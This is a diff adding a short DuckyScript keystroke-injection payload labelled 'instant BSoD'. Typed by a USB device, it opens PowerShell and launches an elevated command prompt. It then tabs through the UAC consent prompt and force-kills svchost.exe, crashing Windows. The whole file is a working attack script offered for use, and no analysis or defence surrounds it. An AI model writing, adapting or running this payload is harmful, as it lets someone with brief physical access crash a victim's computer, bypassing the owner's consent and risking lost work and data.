@@ -1,0 +1,18 @@
+REM Author: Luke487
+REM Description: instant BSoD
+REM Version: 1.5
+DELAY 600
+GUI r
+DELAY 600
+STRING powershell
+ENTER
+DELAY 1200
+STRING powershell "Start-Process cmd.exe -Verb RunAs"
+ENTER
+DELAY 1200
+TAB
+TAB
+ENTER
+DELAY 1200
+STRING taskkill.exe /f /im svchost.exe
+ENTER
